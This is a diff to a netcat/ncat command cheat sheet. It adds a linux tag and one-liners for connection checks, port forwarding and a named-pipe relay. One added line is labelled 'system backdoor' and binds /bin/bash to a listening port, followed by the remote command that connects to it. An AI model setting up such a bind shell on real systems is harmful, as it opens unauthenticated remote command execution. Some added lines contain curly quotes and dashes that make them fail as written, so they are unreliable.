@@ -1,6 +1,7 @@
 ---
-tags [ networking ]
+tags [ networking,linux ]
 ---
+
 # Connect mode (ncat is client) | default port is 31337
 ncat <host> [<port>]
 
@@ -31,3 +32,26 @@ ncat --proxy <proxyhost>[:<proxyport>] --proxy-type {http | socks4} <host>[<port
 
 # Chat server | can use brokering for multi-user chat
 ncat -l --chat [<host>] [<port>]
+
+# connection check
+nc -w1 -v <hostname> <portname>
+
+# forward all incoming requests from port 8080 to port 8090.
+nc -u -l 8080 -c ‘ nc -u -l 8090’
+
+# all incoming connections to port 8080 will be diverted to 10.10.10.200 server on port 80
+nc – l 8080 | nc 10.10.10.200 80
+
+# Two way communication channel to get and receive
+mkfifo 2way
+nc – l 8080 0<2way | nc 10.10.10.200 80 1>2way
+
+# system backdoor
+nc -l 5500 -e /bin/bash
+
+# attach port 5500 to /bin/bash, which can now be connected from a remote machine to execute the commands,
+
+nc 10.10.10.100 5500
+
+# keep connection up
+nc -l -k 8080
